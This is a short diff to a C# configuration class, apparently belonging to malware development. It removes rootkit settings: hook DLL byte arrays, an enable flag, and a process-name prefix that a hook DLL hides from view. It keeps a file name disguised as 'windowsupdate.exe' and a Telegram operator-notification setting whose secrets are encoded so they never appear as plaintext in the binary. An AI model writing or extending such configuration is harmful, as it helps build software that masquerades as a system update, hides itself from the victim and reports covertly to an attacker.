@@ -35,14 +35,7 @@ internal static class Config
 
     public const string ClientIdPrefix = "Spas";
 
-    // HiddenProcessName = install filename without extension = DLL prefix
-    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
-    public const string HiddenProcessName = "windowsupdate";
     public const string HiddenFileName = "windowsupdate.exe";
-
-    public const bool EnableRootkit = false;
-    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();
-    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();
 
     // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
     public const bool TelegramEnabled = false;
